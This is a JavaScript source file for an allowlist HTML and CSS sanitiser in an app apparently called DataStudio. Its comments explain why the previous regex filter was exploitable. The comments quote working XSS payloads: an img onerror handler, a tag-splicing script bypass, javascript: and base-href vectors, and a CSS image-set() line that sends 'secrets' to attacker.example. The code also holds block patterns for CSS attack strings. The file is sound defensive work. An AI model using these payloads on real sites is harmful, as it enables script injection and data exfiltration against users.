/*
  lib/sanitize.js
  --------------------------------------------------------------------------
  Turning stored block HTML into HTML that is safe to write into a document.

  WHY THE PREVIOUS VERSION WAS NOT JUST INCOMPLETE BUT ACTIVELY DANGEROUS

  It was two regexes over the input:

      .replace(/<script[\s\S]*?<\/script>/gi, '')
      .replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')

  Three separate failures, and the third is the one that matters:

  1. A BLOCKLIST. `<iframe src="javascript:…">`, `<object data=…>`,
     `<meta http-equiv=refresh>`, `<base href=//evil>`, `<form action=…>` and
     `<svg><animate attributeName=href values=javascript:…>` all sail through,
     because none of them are the two things being looked for.

  2. `\son\w+` NEEDS LEADING WHITESPACE. HTML also accepts `/` as an attribute
     separator, so `<img/src=x/onerror=alert(1)>` parses as a real handler and
     never matches. That one fires with no user interaction.

  3. String.replace SPLICES AND NEVER RESCANS. Removing the inner match from

         <sc<script>x</script>ript>alert(1)</sc<script>y</script>ript>

     joins `<sc` to `ript>` and PRODUCES `<script>alert(1)</script>`. The
     sanitiser manufactured the tag. No amount of patching a blocklist fixes
     that, because the flaw is the splice, not the pattern.

  And it mattered more than "it's only your own content", because `exportPdf`
  does `window.open('')` then `document.write(...)` — and a script-opened
  about:blank INHERITS THIS ORIGIN. Anything surviving here runs as DataStudio,
  with every notebook, spreadsheet, image and PDF in IndexedDB in reach.

  HOW THIS ONE WORKS

  A single forward scan that BUILDS THE OUTPUT FROM SCRATCH. Nothing from the
  input is ever spliced into the result — a tag is re-emitted from an allowlist
  of names and attributes, or it is escaped into text. That makes failure 3
  structurally impossible rather than patched.

  It is fail-closed at every branch: an unknown element, an unknown attribute,
  an unparseable `<`, a malformed comment — all become escaped text, which is
  visible and harmless, rather than being passed through, which is invisible
  and might not be. A few dangerous containers have their CONTENTS dropped as
  well, because the text inside <script> is not text, it is code.

  WHY NOT DOMParser, OR DOMPurify

  DOMParser needs a browser, and `blocksToHtml` is exercised by the Node test
  suite — a sanitiser that cannot be unit-tested is the wrong trade for this.
  DOMPurify is the better answer if the threat model hardens (it has years of
  mXSS hardening this does not), and it is the recommended upgrade the day §9
  starts accepting templates written by other people. Until then, this is
  auditable in one sitting, has no dependency, and is covered both by unit
  tests and by an execution test in a real browser — tests/browser/run.mjs
  injects the output into a live page and asserts nothing runs.
  -------------------------------------------------------------------------- */

import { safeLinkUrl } from './urls.js'

/* Elements a document can legitimately contain. Deliberately small: this is
   the output of a rich-text field, not a web page. Notably absent and staying
   absent — svg and math (foreign content is where mXSS lives), iframe, object,
   embed, form and its inputs, style, link, base, meta, template, noscript. */
const ALLOWED = new Set([
  'p', 'div', 'span', 'br', 'hr',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'del', 'ins', 'mark', 'small', 'sub', 'sup',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code',
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'td', 'th', 'caption',
  'a', 'img', 'figure', 'figcaption',
])

/* No closing tag, so they must not go on the open-element stack. */
const VOID = new Set(['br', 'hr', 'img', 'wbr', 'col', 'area', 'base', 'input', 'link', 'meta', 'source'])

/* Dropping the TAG is not enough for these — what is between them is not text.
   Everything up to the matching close tag goes with it. */
const DROP_CONTENT = new Set(['script', 'style', 'iframe', 'object', 'embed', 'template', 'noscript', 'svg', 'math', 'title', 'textarea'])

/* Per-element attribute allowlist. Everything global — class, id, style, data-*
   — is dropped: the export stylesheet targets classes this module's CALLER
   emits, never one that arrived in user content, and `style` is a vector
   (behavior:, expression(), url(javascript:)) with no benefit here. */
const ATTRS = {
  a: new Set(['href', 'title']),
  img: new Set(['src', 'alt', 'width', 'height']),
  td: new Set(['colspan', 'rowspan']),
  th: new Set(['colspan', 'rowspan', 'scope']),
  ins: new Set(['datetime']),
  del: new Set(['datetime']),
}

/* Teleporter links are the one piece of app-specific markup that has to
   survive an export — a span carrying an internal address. The VALUE is
   escaped like any other, and it never becomes a URL. */
const DATA_OK = new Set(['data-ds-link'])

/* ── TWO PROFILES, BECAUSE THERE ARE TWO JOBS ─────────────────────────────
   Everything above describes the EXPORT profile: produce a portable document,
   drop anything the destination has no reason to trust, including all styling.

   The EDITOR profile is what runs on content going into and out of a text
   block, and it cannot be that strict — because the block's own markup would
   not survive it. A checklist is an <input type="checkbox"> inside a
   [data-type="checklist"] wrapper with inline sizing. Run the export profile
   over stored content and every checkbox in every note is deleted, every
   checklist loses the attribute its layout hangs off, and every coloured span
   turns black. That is a worse outcome than the vulnerability it was meant to
   close.

   So the editor profile keeps exactly what the editor itself emits and removes
   everything executable: no script, no event handlers, no javascript: URLs, no
   url() in styles, no <style> blocks. */
const EDITOR_ALLOWED = new Set([...ALLOWED, 'input'])
/* `data-ds-pagebreak` marks a DELIBERATE page break in a Document block.

   It has to survive the editor profile or every page break vanishes on the next
   save — silent loss of something the user placed on purpose, and the worst kind
   of bug because the document looks fine until it is exported.

   Safe by construction, like data-ds-link and data-type: the value is escaped
   with every other attribute value, it never becomes a URL, and nothing
   interprets it except one querySelectorAll in the exporter. */
const EDITOR_DATA_OK = new Set([...DATA_OK, 'data-type', 'data-ds-pagebreak'])
const EDITOR_ATTRS = {
  ...ATTRS,
  a: new Set(['href', 'title', 'style']),
  input: new Set(['type', 'checked', 'style', 'contenteditable']),
  span: new Set(['style']),
  /* `contenteditable` on a div: the Document block's page-break marker sets it
     to "false" so the caret cannot land inside a page break and leave somebody
     editing the inside of one. Allowing the attribute cannot grant script
     execution — it only ever changes editability — and the checklist input
     already relies on the same attribute for the same reason. */
  div: new Set(['style', 'contenteditable']),
  p: new Set(['style']),
  li: new Set(['style']),
  ul: new Set(['style']),
  ol: new Set(['style']),
  pre: new Set(['style']),
  code: new Set(['style']),
  h1: new Set(['style']), h2: new Set(['style']), h3: new Set(['style']),
  h4: new Set(['style']), h5: new Set(['style']), h6: new Set(['style']),
  blockquote: new Set(['style']),
  strong: new Set(['style']), em: new Set(['style']), u: new Set(['style']),
  s: new Set(['style']), mark: new Set(['style']),
}

/* Declarations the editor legitimately writes. An allowlist rather than a
   blocklist: the interesting CSS attacks are things nobody thought to ban
   (-moz-binding, behavior, expression()), and a list of what IS wanted does
   not have that failure mode. */
const CSS_PROPS = new Set([
  'color', 'background', 'background-color', 'accent-color',
  'font-weight', 'font-style', 'font-size', 'font-family', 'line-height',
  'text-decoration', 'text-align', 'letter-spacing',
  'margin', 'margin-top', 'margin-bottom', 'margin-left', 'margin-right',
  'padding', 'padding-top', 'padding-bottom', 'padding-left', 'padding-right',
  'width', 'height', 'min-height', 'max-width',
  'display', 'flex', 'flex-shrink', 'align-items', 'gap',
  'border', 'border-left', 'border-radius', 'outline', 'cursor',
  'white-space', 'overflow-x',
])
/* `position` is deliberately NOT on that list, and the reason is worth
   keeping: `position:fixed;width:100vw;height:100vh` in a pasted span is a
   transparent sheet over the entire app — every click the user thinks they are
   making on the canvas goes to whatever the attacker put underneath. Nothing
   the editor emits needs position, so nothing is lost by refusing it.

   Viewport units go with it for the same reason: they are how an element sizes
   itself to the SCREEN rather than to the text it belongs to. */
/* Every viewport-unit spelling, including the small/large/dynamic variants
   (svw, lvh, dvmin …) that a blocklist written from memory always misses. */
const CSS_VIEWPORT_UNIT = /\d\s*[sld]?v(?:w|h|i|b|min|max)\b/i

/* No url(), no expression(), no behavior:, no escapes, no comments. Anything
   with a character outside this set is dropped whole rather than repaired —
   a value that needs repairing is a value nobody meant to type. */
const CSS_VALUE_OK = /^[-#a-zA-Z0-9 .,%()/'"]+$/
const CSS_VALUE_BAD = /expression|javascript:|behaviou?r|@import|\\/i

/* THE PROPERTY LIST WAS AN ALLOWLIST AND THE VALUE CHECK WAS NOT.
 
   The comment above CSS_PROPS says the interesting CSS attacks are "things
   nobody thought to ban", which is exactly right — and then the value check
   banned one specific spelling, `url(`. CSS has several other ways to name an
   image, and `image-set()` takes a plain string:
 
       <span style="background:image-set('//attacker.example/p.png?q=secrets' 1x)">
 
   passed the filter untouched, and fires on render with no interaction. So do
   `-webkit-image-set()`, `cross-fade()`, `image()`, `src()`, `element()` and
   `paint()`. Enumerating them is the same losing game one layer down.
 
   Inverted: a value may contain `(` only if every function in it is one the
   editor actually emits. Nothing in this app writes a CSS function into a
   style attribute except through the colour picker, so the list is short and
   the failure mode of a missing entry is a dropped declaration rather than a
   network request. */
const CSS_FN_OK = new Set(['rgb', 'rgba', 'hsl', 'hsla', 'var', 'calc'])
const CSS_FN_ANY = /([-a-zA-Z][-a-zA-Z0-9]*)\s*\(/g
function cssFunctionsOk(value) {
  CSS_FN_ANY.lastIndex = 0
  let m
  while ((m = CSS_FN_ANY.exec(value))) {
    if (!CSS_FN_OK.has(m[1].toLowerCase())) return false
  }
  return true
}

/** Filter a style attribute down to declarations the editor is known to emit. */
function safeStyle(value) {
  const kept = []
  for (const decl of String(value).split(';')) {
    const idx = decl.indexOf(':')
    if (idx < 1) continue
    const prop = decl.slice(0, idx).trim().toLowerCase()
    const val = decl.slice(idx + 1).trim()
    if (!CSS_PROPS.has(prop)) continue
    if (!val || val.length > 120) continue
    if (CSS_VALUE_BAD.test(val) || CSS_VIEWPORT_UNIT.test(val)) continue
    if (!CSS_VALUE_OK.test(val)) continue
    /* Every CSS function in the value must be one the editor emits. This is
       what closes image-set() and its relatives — see CSS_FN_OK. */
    if (!cssFunctionsOk(val)) continue
    kept.push(`${prop}:${val}`)
  }
  return kept.join(';')
}

/* AN AMPERSAND THAT ALREADY BEGINS AN ENTITY IS LEFT ALONE.

   This function's input is HTML, not plain text — it comes from a
   contentEditable, which stores a typed "&" as "&amp;", a "<" as "&lt;", and
   so on. Escaping every ampersand unconditionally therefore escapes the
   escapes: "Q&amp;A" became "Q&amp;amp;A", and the exported document showed
   the reader a literal "Q&amp;A". It compounded, too — two passes gave
   "&amp;amp;amp;" — so anything that sanitised twice degraded further each
   time.

   Every text block containing &, < or > exported wrong, in every format that
   goes through blocksToHtml: HTML, PDF and DOCX. Reproduced before fixing:

     in    <p>Q&amp;A &lt;tag&gt;</p>
     out   <p>Q&amp;amp;A &amp;lt;tag&amp;gt;</p>

   Skipping a well-formed entity is safe, and is what every real sanitiser
   does. An entity decodes to a CHARACTER in a text position; it cannot
   produce markup, because markup needs a "<" and that is still escaped
   unconditionally on every path. "&lt;script&gt;" left intact stays the
   visible text "<script>" and is never a tag.

   The pattern deliberately requires the closing semicolon. A bare "AT&T" has
   no entity after the ampersand, so it is escaped, exactly as before. */
const ENTITY_AHEAD = /&(?!#\d+;|#[xX][0-9a-fA-F]+;|[a-zA-Z][a-zA-Z0-9]{1,31};)/g

const escText = s => String(s)
  .replace(ENTITY_AHEAD, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')

/* Attribute values need the same treatment for the same reason, and one more
   of their own: a href with a query string carries "&amp;" between parameters,
   and double-escaping it produced a link that 404s. */
const escAttr = s => String(s)
  .replace(ENTITY_AHEAD, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;')

/* Attribute values are read with the SAME leniency a browser reads them:
   `/` and whitespace both separate, quotes are optional. Being stricter than
   the browser here is the `\son\w+` bug — a handler the parser sees and the
   sanitiser does not. */
const ATTR_RE = /([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>`]+)))?/g

function attrsFor(tag, raw, profile) {
  const allowed = profile.attrs[tag]
  const out = []
  ATTR_RE.lastIndex = 0
  let m
  while ((m = ATTR_RE.exec(raw)) !== null) {
    const name = m[1].toLowerCase()
    const value = m[2] ?? m[3] ?? m[4] ?? ''

    /* Belt and braces. No `on*` attribute is on any allowlist above, so this
       cannot trigger — it is here so that adding an element to ATTRS can never
       accidentally open the door. */
    if (name.startsWith('on')) continue

    if (profile.dataOk.has(name)) { out.push(`${name}="${escAttr(value)}"`); continue }
    if (!allowed || !allowed.has(name)) continue

    if (name === 'style') {
      const css = safeStyle(value)
      if (css) out.push(`style="${escAttr(css)}"`)
      continue
    }
    /* A bare `checked` or `contenteditable="false"` — value-less or fixed. */
    if (name === 'checked') { out.push('checked="checked"'); continue }
    if (name === 'type') {
      if (value.toLowerCase() !== 'checkbox') continue
      out.push('type="checkbox"'); continue
    }

    if (name === 'href' || name === 'src') {
      /* One allowlist for URLs, shared with the link prompt and the ctrl-click
         handler, so all three agree about what a safe scheme is. */
      const safe = safeLinkUrl(value)
      if (!safe) continue
      out.push(`${name}="${escAttr(safe)}"`)
      continue
    }
    if (name === 'width' || name === 'height' || name === 'colspan' || name === 'rowspan') {
      if (!/^\d{1,5}$/.test(value.trim())) continue
      out.push(`${name}="${value.trim()}"`)
      continue
    }
    out.push(`${name}="${escAttr(value)}"`)
  }

  /* Any link that survived is external and opens in a new tab, so it needs
     rel — target="_blank" without it hands the destination a live opener. */
  if (tag === 'a' && out.some(a => a.startsWith('href='))) {
    out.push('target="_blank"', 'rel="noopener noreferrer nofollow"')
  }
  return out.length ? ' ' + out.join(' ') : ''
}

/**
 * Allowlist-sanitise a fragment of HTML.
 *
 * @param {string} input
 * @returns {string} HTML safe to insert into a document
 */
const EXPORT_PROFILE = { allowed: ALLOWED, attrs: ATTRS, dataOk: DATA_OK }
const EDITOR_PROFILE = { allowed: EDITOR_ALLOWED, attrs: EDITOR_ATTRS, dataOk: EDITOR_DATA_OK }

/**
 * Allowlist-sanitise a fragment of HTML for EXPORT.
 *
 * Strips all styling and every attribute the destination has no reason to
 * trust. Use this for anything leaving the app.
 */
export function sanitizeHtml(input) {
  return scan(input, EXPORT_PROFILE)
}

/**
 * Allowlist-sanitise a fragment of HTML for the EDITOR.
 *
 * Keeps what a text block itself emits — checklists, colours, inline layout —
 * and removes everything executable. Use this on content going into a
 * contentEditable and on anything arriving from the clipboard.
 *
 * The two are not interchangeable. Running the export profile over stored
 * content deletes every checkbox in every note.
 */
export function sanitizeEditorHtml(input) {
  return scan(input, EDITOR_PROFILE)
}

function scan(input, profile) {
  const src = String(input ?? '')
  let out = ''
  let i = 0
  const open = []          // element stack, so unclosed tags get closed
  let skipUntil = null     // inside a DROP_CONTENT element

  while (i < src.length) {
    const lt = src.indexOf('<', i)

    if (lt === -1) {
      if (!skipUntil) out += escText(src.slice(i))
      break
    }
    if (lt > i) {
      if (!skipUntil) out += escText(src.slice(i, lt))
    }

    /* Comments. Dropped entirely — conditional comments are an execution
       vector in older engines and there is no reason to carry one into an
       exported document. An UNTERMINATED comment consumes the rest of the
       input, exactly as a parser would; stopping early would let markup after
       a `<!--` be treated as live by the sanitiser and as comment by the
       browser, or the reverse. */
    if (src.startsWith('<!--', lt)) {
      const end = src.indexOf('-->', lt + 4)
      i = end === -1 ? src.length : end + 3
      continue
    }
    /* Doctypes, CDATA, processing instructions: dropped the same way. */
    if (src.startsWith('<!', lt) || src.startsWith('<?', lt)) {
      const end = src.indexOf('>', lt)
      i = end === -1 ? src.length : end + 1
      continue
    }

    const m = /^<(\/?)([a-zA-Z][a-zA-Z0-9]*)([^>]*)>/.exec(src.slice(lt))
    if (!m) {
      /* A `<` that does not begin a tag is a literal less-than. Escaping it
         is what makes `a < b` survive, and what makes a malformed construct
         visible instead of ambiguous. */
      if (!skipUntil) out += '&lt;'
      i = lt + 1
      continue
    }

    const [full, closing, rawName, rawAttrs] = m
    const tag = rawName.toLowerCase()
    i = lt + full.length

    if (skipUntil) {
      // Only the matching close tag ends a dropped region.
      if (closing && tag === skipUntil) skipUntil = null
      continue
    }

    if (closing) {
      if (!profile.allowed.has(tag) || VOID.has(tag)) continue
      /* A close tag with no matching open is a stray — dropping it beats
         emitting one that would close something it never opened. */
      const at = open.lastIndexOf(tag)
      if (at === -1) continue
      /* Implicitly close anything left open inside it, so the output is
         balanced even when the input was not. */
      while (open.length > at) out += `</${open.pop()}>`
      continue
    }

    if (DROP_CONTENT.has(tag)) {
      /* `<svg/>` DOES NOT CLOSE ANYTHING — see the note at the bottom of this
         function. Treating it as self-closed meant a single `/` switched off
         the content drop for the most dangerous elements in the list. */
      skipUntil = tag
      continue
    }
    if (!profile.allowed.has(tag)) continue

    const attrs = attrsFor(tag, rawAttrs, profile)
    /* An <img> whose src was refused has nothing left to show. Emitting the
       bare element leaves a broken-image icon in the export standing in for
       something that was never going to load — dropping it is both cleaner and
       one less element for a reader to wonder about. */
    if (tag === 'img' && !/\ssrc=/.test(attrs)) continue
    /* Same rule, sharper consequence. An <input> whose type was refused does
       not render as nothing — it renders as a TEXT FIELD, because that is the
       default. A note containing a text field that looks like it belongs to
       the app is a credential-harvesting shape, so the element goes with the
       attribute. */
    if (tag === 'input' && !/\stype="checkbox"/.test(attrs)) continue

    out += `<${tag}${attrs}>`
    /* THE TRAILING SLASH IS NOT A CLOSE, AND HTML HAS NEVER SAID IT WAS.
 
       This used to read `!VOID.has(tag) && !/\/\s*$/.test(rawAttrs)`, i.e. it
       trusted an author's `<a href="..." />` to be self-closing. In HTML a
       solidus before `>` on a non-void, non-foreign element is a parse error
       that browsers IGNORE: `<a/>` opens an anchor and nothing closes it.
 
       So the tag never reached this stack, the balancing loop below never
       emitted `</a>`, and the browser parsed the entire remainder of the block
       as the anchor's children:
 
           <a href="https://evil.example/" />Quarterly numbers look fine.
 
       became one link over the whole paragraph. Harmless-ish inside
       contentEditable, which swallows the click; live in the exported HTML and
       in the print window that becomes the PDF. It also broke this file's own
       idempotence claim — a second pass appends the `</a>` the first did not.
 
       Only VOID decides now, which is the rule the parser uses. */
    if (!VOID.has(tag)) open.push(tag)
  }

  while (open.length) out += `</${open.pop()}>`
  return out
}

/** True when sanitising would change the markup — for tests and diagnostics. */
export const isCleanHtml = html => sanitizeHtml(html) === String(html ?? '')
